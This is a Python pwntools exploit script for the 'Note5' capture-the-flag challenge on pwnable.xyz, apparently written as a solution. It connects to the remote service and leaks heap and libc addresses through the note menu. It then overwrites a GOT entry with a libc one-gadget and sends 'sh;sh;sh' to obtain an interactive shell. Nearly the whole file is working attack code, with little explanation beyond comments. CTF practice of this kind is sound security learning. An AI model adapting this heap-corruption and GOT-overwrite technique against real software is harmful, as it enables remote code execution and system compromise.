from pwn import *
import time

# Pwnable.xyz Note5 challenge


context(kernel="amd64", arch="amd64", log_level="debug")


def main():
	e = ELF("challenge")
	env = dict(os.environ)
	l = ELF("alpine-libc-2.24.so")

	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		gdb.attach(p, gdbscript="b edit_note\nc"); time.sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30047)



	def make_note(text):
		p.sendlineafter(b"> ", b"1")
		p.sendafter(b"note:", text)


	def read_note(note_id):
		p.sendlineafter(b"> ", b"2")
		p.sendlineafter(b"id:", note_id)
		p.recvuntil(b"note: ")
		return p.recvuntil(b"\nMenu:")[:-6]

	def edit_note(note_id, new_text):
		p.sendlineafter(b"> ", b"3")
		p.sendlineafter(b"id:", note_id)
		p.sendafter(b"note: ", new_text)


	puts_got = e.got["puts"]
	l_puts_off = l.symbols["puts"]
	libc_onegadget_off = 0x000000000068098 # require $r12 = "target_program"
	libc_onegadget_off = 0x0000000000403BB # require [rsp+0x30] == 0
	libc_onegadget_off = 0x000000000040360 # require $rbx = "target_program" 

	make_note(b"0"*41)
	make_note(b"1"*41)
	# make_note(b"2"*41)
	# make_note(b"3"*41)
	leaked = read_note(b"0")
	leaked = leaked.split(b"0")[-1]
	print(f"Leaked Heap memory: {leaked}")
	lower_byte = leaked[0]
	if lower_byte < 0x58:
		print("Lower byte is below expected value!!!")
		exit(0)

	first_address = u64(leaked.ljust(8, b"\x00"))
	zero_address = first_address - 0x50

	if zero_address < 0xffff:
		print("To low leaked address!!")
		exit(0)

	print(hex(first_address))
	print(hex(zero_address))
	# return


	edit_note(b"0", p64(zero_address-8)*5+b"A")

	read_note(str(0x28).encode())

	edit_note(str(0x28).encode(), p8(20)+b"\n")

	read_note(b"20")

	# Now note_id's: 20 -> 0x51 -> 0x28 -> unkn

	# Set size parameter for the future note before puts
	edit_note(b"20", (p64(puts_got-0x10-0x38)*5)[:-1]+b"\n")
	make_note(b"ended\n")

	edit_note(b"20", (p64(puts_got-0x10)*5)[:-1]+b"\n")

	# Now note_id's: 20 -> 0x51 -> 0 (before got) -> unkn (probably some in libc)

	# leaked_puts = read_note(b"0")
	puts_leak = read_note(b"0")
	puts_addr = u64(puts_leak.ljust(8, b"\x00"))

	print(f"Puts leaked: {hex(puts_addr)}")

	if puts_addr < 0xfffff:
		print("Puts address is low!!!!")
		exit(0)

	libc_base = puts_addr - l_puts_off
	print(f"Libc base: {hex(libc_base)}")
	one_gad = libc_base + libc_onegadget_off


	edit_note(b"0", p64(one_gad)[:-1]+b"\n")

	# Send fake data, so at the next iteraction $rbx will point to "sh" command 
	p.sendlineafter(b"> ", b"sh;sh;sh")
	# Trigger libc one-gadget system execution
	p.sendlineafter(b"> ", b"4") 

	p.interactive()
	return

	


	p.interactive()

main()
